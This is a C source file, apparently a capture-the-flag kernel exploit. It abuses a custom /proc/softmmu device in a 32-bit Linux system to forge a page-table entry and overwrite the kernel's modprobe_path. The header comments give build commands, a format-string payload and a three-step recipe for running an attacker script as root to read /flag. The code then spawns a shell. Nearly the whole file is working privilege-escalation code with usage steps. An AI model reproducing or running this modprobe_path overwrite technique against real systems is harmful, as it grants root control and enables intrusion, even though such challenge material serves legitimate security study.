//  gcc --no-pie -fno-pie -m32 exploit.c -o exploit
// musl-gcc --no-pie -fno-pie -m32 -static exploit.c -o exploit

// 1. Overwrite modprobe_path
// ./exploit %103c%n%105c%n%183c%n

// 2. Create a malicious script
// cat > /tmp/pwned << 'EOF'
// #!/bin/sh
// cat /etc/init.d/rcS > /tmp/rcS
// cat /flag > /tmp/flag
// EOF
// chmod +x /tmp/pwned

// 3. Trigger the call to modprobe_path
// echo -ne "\xff\xff\xff\xff" > /tmp/f
// chmod u+x tmp/f; /tmp/f

#include <stdio.h>
#include <string.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <unistd.h>

#define PAGE_OFFSET 0xC0000000

int main(int argc, char** argv) {
  unsigned long map_addr = 0x200000;
  unsigned long map_size = 0x1000;

  if (argc != 2) {
    printf("Usage: %s payload\n",argv[0]);
    return 1;
  }

  // map the payload address
  char *p = (char*)mmap((void*)map_addr, map_size, PROT_READ|PROT_WRITE|PROT_EXEC , MAP_ANONYMOUS | MAP_SHARED, 0, 0);
  if((unsigned long)p < 0) {
   perror("mmap");
  }

  // copy payload
  memcpy(p, argv[1], strlen(argv[1]));

  // open /proc/softmmu
  int fd = open("/proc/softmmu",O_RDWR);
  if (fd == -1) {
   perror("open");
  }

  // write to /proc/softmmu
  write(fd,"\x00\x00\x20",4);

  // read from /proc/softmmu
   unsigned char phy[4];
   read(fd,phy,4);
   printf("\n[+] Physical Address: [0x%x%x%x%x]\n",phy[3],phy[2],phy[1],phy[0]);
  unsigned long vaddr = (unsigned long)p;
 
  // modprobe_path
  unsigned long VA = 0xc187d3c0;
  unsigned long PA = VA - PAGE_OFFSET;
  unsigned long PFN = PA >> 12;
  unsigned long new_pte = (PFN << 12) | 0x167;
  printf("[+] New PTE: 0x%lx\n",new_pte);

  // ./exploit2 %103c%n%105c%n%183c%n // 0x187d067 

  // Invalidate TLB
  mprotect(p, map_size, PROT_READ | PROT_WRITE);
  mprotect(p, map_size, PROT_READ | PROT_WRITE | PROT_EXEC);

  // Overwrite /sbin/modprobe
  printf("[+] Current value: %s\n",p+0x3c0);
  char *new_path =  "/tmp/pwned\x00";
  memcpy(p+0x3c0,new_path,strlen(new_path)+1);
  printf("[+] New value: %s\n",p+0x3c0);

  // a little test
  FILE* f = popen("cat /proc/sys/kernel/modprobe","r");
  unsigned char buf[30];
  fread(buf,30,1,f);
  printf("[+] /proc/sys/kernel/modprobe: %s\n",buf);

  // it works! but crashes after
  pid_t pid = fork();
  if (pid == 0) {
    execl("/bin/sh", "sh", NULL);
  } else {
    printf("[+] Launching shell, PID %d\n", pid);
    //while(1) pause();
  }

  return 0;
}